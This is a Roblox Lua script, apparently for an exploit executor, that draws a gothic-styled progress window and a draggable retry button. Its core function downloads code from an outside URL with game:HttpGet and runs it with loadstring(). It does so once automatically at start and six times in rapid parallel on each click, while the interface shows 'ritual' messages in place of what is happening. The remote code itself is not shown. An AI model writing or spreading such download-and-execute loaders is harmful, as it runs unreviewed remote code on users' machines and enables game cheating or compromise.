local player = game.Players.LocalPlayer

-- ===============================
-- PERMANENT DRAGGABLE RETRY BUTTON
-- ===============================
local retryGui = Instance.new("ScreenGui")
retryGui.Name = "PermanentRetryButton"
retryGui.ResetOnSpawn = false
retryGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
retryGui.Parent = player:WaitForChild("PlayerGui")

-- Main button frame
local buttonFrame = Instance.new("Frame")
buttonFrame.Size = UDim2.new(0, 220, 0, 50)
buttonFrame.Position = UDim2.new(1, -240, 0.1, 0)
buttonFrame.BackgroundColor3 = Color3.fromRGB(25, 10, 15)
buttonFrame.BorderSizePixel = 0
buttonFrame.Active = true
buttonFrame.Selectable = true
buttonFrame.Draggable = true
buttonFrame.Parent = retryGui

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = buttonFrame

local buttonStroke = Instance.new("UIStroke", buttonFrame)
buttonStroke.Thickness = 2
buttonStroke.Color = Color3.fromRGB(255, 80, 80)
buttonStroke.Transparency = 0.2
buttonStroke.Parent = buttonFrame

-- Retry Button
local retryButton = Instance.new("TextButton")
retryButton.Size = UDim2.new(1, -20, 1, -10)
retryButton.Position = UDim2.new(0, 10, 0, 5)
retryButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
retryButton.BorderSizePixel = 0
retryButton.Text = "Click Here If Gui Doesnt Show Up!"
retryButton.Font = Enum.Font.Garamond
retryButton.TextSize = 18
retryButton.TextColor3 = Color3.fromRGB(255, 255, 255)
retryButton.TextStrokeTransparency = 0.8
retryButton.Parent = buttonFrame

local innerButtonCorner = Instance.new("UICorner")
innerButtonCorner.CornerRadius = UDim.new(0, 6)
innerButtonCorner.Parent = retryButton

local innerButtonStroke = Instance.new("UIStroke", retryButton)
innerButtonStroke.Thickness = 1
innerButtonStroke.Color = Color3.fromRGB(255, 180, 180)
innerButtonStroke.Transparency = 0.3
innerButtonStroke.Parent = retryButton

-- Close button
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 20, 0, 20)
closeButton.Position = UDim2.new(1, -25, 0, -10)
closeButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
closeButton.BorderSizePixel = 0
closeButton.Text = "×"
closeButton.Font = Enum.Font.Garamond
closeButton.TextSize = 16
closeButton.TextColor3 = Color3.new(1, 1, 1)
closeButton.Parent = buttonFrame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(1, 0)
closeCorner.Parent = closeButton

-- ===============================
-- GOTHIC GUI
-- ===============================
local gui = Instance.new("ScreenGui")
gui.Name = "GothicExecutionWarning"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 420, 0, 180)
frame.Position = UDim2.new(0.5, -210, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(15, 12, 20)
frame.BorderSizePixel = 0
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame

local stroke = Instance.new("UIStroke", frame)
stroke.Thickness = 3
stroke.Color = Color3.fromRGB(200, 170, 100)
stroke.Transparency = 0.3
stroke.Parent = frame

local innerFrame = Instance.new("Frame")
innerFrame.Size = UDim2.new(1, -6, 1, -6)
innerFrame.Position = UDim2.new(0, 3, 0, 3)
innerFrame.BackgroundTransparency = 1
innerFrame.BorderSizePixel = 0
innerFrame.Parent = frame

local innerStroke = Instance.new("UIStroke", innerFrame)
innerStroke.Thickness = 1
innerStroke.Color = Color3.fromRGB(100, 80, 120)
innerStroke.Transparency = 0.5
innerStroke.Parent = innerFrame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.Font = Enum.Font.Garamond
title.TextSize = 26
title.TextColor3 = Color3.fromRGB(200, 170, 100)
title.Text = "⚜ EXECUTION RITUAL ⚜"
title.Parent = frame

local text = Instance.new("TextLabel")
text.Size = UDim2.new(1, -40, 0, 60)
text.Position = UDim2.new(0, 20, 0, 60)
text.BackgroundTransparency = 1
text.TextWrapped = true
text.Font = Enum.Font.Garamond
text.TextSize = 18
text.TextColor3 = Color3.fromRGB(180, 180, 185)
text.Text = "Initiating ceremonial sequence..."
text.Parent = frame

local progress = Instance.new("TextLabel")
progress.Size = UDim2.new(1, -40, 0, 30)
progress.Position = UDim2.new(0, 20, 0, 125)
progress.BackgroundTransparency = 1
progress.Font = Enum.Font.Garamond
progress.TextSize = 16
progress.TextColor3 = Color3.fromRGB(150, 130, 70)
progress.Text = "Phase: 1/3 • Step: 1/2"
progress.Parent = frame

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -40, 0, 20)
status.Position = UDim2.new(0, 20, 0, 155)
status.BackgroundTransparency = 1
status.Font = Enum.Font.Garamond
status.TextSize = 14
status.TextColor3 = Color3.fromRGB(120, 120, 120)
status.Text = "Status: Beginning ritual..."
status.Parent = frame

-- ===============================
-- ULTRA FAST EXECUTION FUNCTION
-- ===============================
local JUNKIE_URL = "https://api.junkie-development.de/api/v1/luascripts/public/3e73ebff1af450511d7cf0bda858517be15f5f269ac343792ac557701ce4a4f1/download"

-- Super fast execution - no delays, just spam execution
local function executeJunkieUltraFast(times)
    print("🚀 ULTRA FAST EXECUTION STARTING: " .. times .. " times")
    
    local originalText = retryButton.Text
    retryButton.Text = "🚀 " .. times .. "x"
    retryButton.BackgroundColor3 = Color3.fromRGB(255, 150, 50)
    
    local successCount = 0
    local totalAttempts = times
    
    -- SPAM EXECUTIONS WITH NO DELAYS
    for i = 1, totalAttempts do
        task.spawn(function()
            local attemptSuccess = false
            
            -- Try multiple methods quickly
            local methods = {
                function()
                    local content = game:HttpGet(JUNKIE_URL)
                    if content then
                        loadstring(content)()
                        return true
                    end
                end,
                function()
                    local content = game:HttpGet(JUNKIE_URL, true)
                    if content then
                        loadstring(content)()
                        return true
                    end
                end
            }
            
            for _, method in ipairs(methods) do
                local success, result = pcall(method)
                if success then
                    attemptSuccess = true
                    break
                end
            end
            
            if attemptSuccess then
                successCount = successCount + 1
                print("⚡ Execution " .. i .. " succeeded")
            else
                print("❌ Execution " .. i .. " failed")
            end
        end)
        
        -- SUPER FAST: Only 0.01 second delay between spawning executions
        task.wait(0.01)
    end
    
    -- Wait a tiny bit for all to complete
    task.wait(0.5)
    
    -- Update button with result
    if successCount > 0 then
        retryButton.Text = "✓ " .. successCount .. "/" .. totalAttempts
        retryButton.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
        print("✅ FINAL: " .. successCount .. "/" .. totalAttempts .. " successful")
    else
        retryButton.Text = "✗ 0/" .. totalAttempts
        retryButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
        print("❌ ALL FAILED")
    end
    
    -- Quick restore
    task.wait(1)
    retryButton.Text = originalText
    retryButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
end

-- Button click - ULTRA FAST 6x execution
local isExecuting = false
retryButton.MouseButton1Click:Connect(function()
    if not isExecuting then
        isExecuting = true
        
        -- Execute 6 times ULTRA FAST
        executeJunkieUltraFast(6)
        
        isExecuting = false
    end
end)

-- Close button
closeButton.MouseButton1Click:Connect(function()
    for i = 1, 15 do
        local fade = i / 15
        buttonFrame.BackgroundTransparency = fade
        buttonStroke.Transparency = 0.2 + (fade * 0.8)
        retryButton.BackgroundTransparency = fade
        retryButton.TextTransparency = fade
        innerButtonStroke.Transparency = 0.3 + (fade * 0.7)
        closeButton.BackgroundTransparency = fade
        closeButton.TextTransparency = fade
        task.wait(0.03)
    end
    retryGui:Destroy()
end)

-- Animation pulse
task.spawn(function()
    local pulse = 0
    while gui and gui.Parent do
        pulse = (pulse + 0.05) % (math.pi * 2)
        stroke.Transparency = 0.3 + (math.sin(pulse) * 0.2)
        task.wait(0.1)
    end
end)

-- Simple Gothic ritual
local function performRitual()
    local phases = 3
    local stepsPerPhase = 2
    
    -- Try to execute once at start
    task.spawn(function()
        task.wait(1)
        local success, _ = pcall(function()
            local content = game:HttpGet(JUNKIE_URL)
            if content then
                loadstring(content)()
            end
        end)
        
        if success then
            text.Text = "✓ Script loaded!"
            stroke.Color = Color3.fromRGB(100, 255, 100)
            task.wait(0.3)
            stroke.Color = Color3.fromRGB(200, 170, 100)
        end
    end)
    
    for phase = 1, phases do
        title.Text = string.format("⚜ PHASE %d/%d ⚜", phase, phases)
        
        for step = 1, stepsPerPhase do
            progress.Text = string.format("Phase: %d/%d • Step: %d/%d", phase, phases, step, stepsPerPhase)
            
            text.Text = "Executing sequence " .. step .. "..."
            task.wait(0.5)
        end
    end
    
    title.Text = "⚜ COMPLETE ⚜"
    text.Text = "USE THE BUTTON ON THE RIGHT CORNER"
    progress.Text = "Top-right draggable button"
    status.Text = "Click for ultra-fast execution"
    
    task.wait(5)
    for i = 1, 20 do
        local fade = i / 20
        frame.BackgroundTransparency = fade
        stroke.Transparency = 0.3 + (fade * 0.7)
        text.TextTransparency = fade
        title.TextTransparency = fade
        progress.TextTransparency = fade
        status.TextTransparency = fade
        task.wait(0.03)
    end
    
    gui:Destroy()
end

-- Start ritual
task.spawn(function()
    for i = 1, 10 do
        local fade = 1 - (i / 10)
        frame.BackgroundTransparency = fade
        stroke.Transparency = 0.3 + (fade * 0.7)
        text.TextTransparency = fade
        title.TextTransparency = fade
        progress.TextTransparency = fade
        status.TextTransparency = fade
        task.wait(0.02)
    end
    
    performRitual()
end)

print("✅ ULTRA FAST RETRY BUTTON LOADED")
print("⚡ Click 'EXECUTE 6x' button for ultra-fast execution")
print("🚀 Executes 6 times with only 0.01s delays")
print("📌 Draggable - move it anywhere")
